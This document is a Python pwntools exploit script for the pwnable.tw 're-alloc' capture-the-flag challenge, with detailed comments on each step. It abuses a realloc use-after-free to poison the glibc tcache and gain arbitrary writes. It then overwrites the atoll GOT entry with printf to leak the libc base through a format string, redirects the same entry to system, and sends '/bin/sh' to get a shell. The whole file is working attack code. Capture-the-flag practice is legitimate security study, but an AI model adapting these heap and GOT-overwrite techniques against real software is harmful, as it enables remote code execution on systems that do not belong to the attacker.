#!/usr/bin/env python3

from pwn import *

import os
os.chdir("./patched")

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

exe = ELF("./re-alloc_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.29.so")

context.binary = exe

serv = "chall.pwnable.tw"
port = 10106

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        cmd = [exe.path]
        r = process(cmd)
        if args.GDB:
            gdb.attach(r, gdbscript="""
            """)
    return r

r = conn()


def common_alloc(type: str, index: int, size: int, data: bytes, if_atoll_working: bool):
    assert size <= 0x78 and (index == 0 or index == 1)
    sla(b'choice: ', b'1' if type == 'alloc' else b'2')
    if if_atoll_working:
        sla(b'Index:', enc(str(index)))
        sla(b'Size:', enc(str(size)))
    else:
        # If atoll() has been overwritten with printf() which returns the no. of bytes written, then
        # we need to make the number of bytes printed be the number we want returned from atoll
        sna(b'Index:', b'A'*index + b'\x00')
        sna(b'Size:', b'%' + sen(size) + b'c')
    if size > 0:
        sna(b'Data:', enc(data))

def alloc(index: int, size: int, data: bytes, if_atoll_working: bool):
    common_alloc('alloc', index, size, data, if_atoll_working)

def realloc(index: int, size: int, data: bytes, if_atoll_working: bool):
    common_alloc('realloc', index, size, data, if_atoll_working)

def free(index: int, if_atoll_working: bool):
    assert index == 0 or index == 1
    sla(b'choice: ', b'3')
    if if_atoll_working:
        sla(b'Index:', sen(index))
    else: 
        sna(b'Index:', b'A'*index + b'\x00')

'''
Function: Sets up the arb write to `addr` that will occur when written allocating a chunk of size 0x40 + num_writes*0x10

Side effects
1. Places 1 chunk into the tcache bin of size 0x20 and eventually will place onto the fastbin of that size
2. Corrupts the tcache bin of sizes 0x40 + num_writes*0x10
3. Clobbers the tcache_perthread_struct's entries[] element for sizes 0x40 + num_writes*0x10
'''
def setup_arb_write(addr: int):

    global num_write_setups
    size_corrupt = 0x38 + num_write_setups * 0x10
    if_atoll_working = True

    # We first free a chunk into the tcache and use the UAF prmitive to directly overwrite its next ptr
    # The size of the chunks are arbitrary but should be the same throughout so that the same tcache bin is accessed
    alloc(0, size_corrupt, b'A'*size_corrupt, if_atoll_working)
    realloc(0, 0, b'', if_atoll_working) # Free while retaining pointer    
    realloc(0, size_corrupt, p64(addr) + b'A'*(size_corrupt-8), if_atoll_working) # Use the UAF primitive to overwrite the next ptr in the freed chunk

    # We still have the tcache entry in the tcache_perthread_struct, so we alloc/realloc this away to the other index of the chunk pointer array
    # This will force the addr we want to write to (which was the next ptr) to be placed in the tcache_perthread_struct for the next alloc
    alloc(1, size_corrupt, b'A'*size_corrupt, if_atoll_working)

    # Now, we cannot easily alloc again because the function (in the binary) will fail since both entries in the chunk pointer array are non-null
    # Thus, we will need to perform the following to get arb-write: 
    # 1. Realloc the chunk to a smaller size to split it into two chunks, where one is used and one is freed
    # 2. Free this smaller chunk (so that it doesn't go into the tcache bin of our orginal size)
    # 3. Alloc a chunk of our original size
    # This will allocate a new chunk of the original size so that arb-write is achieved
    # However, we defer the arb-write since that will corrupt one of the two chunk ptr array entries and prevent the setting up of more arb-writes
    realloc(1, 0x10, b'A'*0x10, if_atoll_working)
    free(1, if_atoll_working)

    # Cleanup so that index 0 can be allocated to again, and increment num_writes_setup
    realloc(0, 0x10, b'A'*0x10, if_atoll_working) # This actually overwrites the tcache key so that libc does not detect a double-free
    free(0, if_atoll_working)
    num_write_setups += 1

'''
Function: Overwrite the qword at the prepared addr with `val`

Side effects:
1. Overwrites the qword at addr+8 with a nullptr
'''
def arb_write(val: int, if_atoll_working: bool):
    global num_writes
    size_corrupt = 0x38 + num_writes * 0x10
    alloc(num_writes, size_corrupt, p64(val), if_atoll_working)
    num_writes += 1

def send_fmtstr_payload(payload: bytes):
    sla(b'choice: ', b'3') # This still works as per normal even though atoll is overwritten because it uses scanf("%d")
    sla(b'Index:', payload)

# Globals
num_write_setups = 0
num_writes = 0

def main():

    setup_arb_write(exe.got.atoll)
    setup_arb_write(exe.got.atoll)

    # Overwrite the GOT entry of atoll with the PLT entry of printf to lead into a fmtstr exploit
    arb_write(exe.plt.printf, if_atoll_working=True)

    # Leak libc
    send_fmtstr_payload('%21$p') # ret addr from main to __libc_start_main
    libc.address = int(r.recvline().strip(), 16) - 0x26b6b
    log.info(f"{hex(libc.address)=}")

    # Overwrite the GOT entry of atoll with __libc_system()
    arb_write(libc.sym.system, if_atoll_working=False)

    # Run system('/bin/sh')
    sla(b'choice: ', b'3') # This still works even though atoll is overwritten because it uses scanf("%d")
    sna(b'Index:', b'/bin/sh\x00')

    r.interactive()


if __name__ == "__main__":
    main()
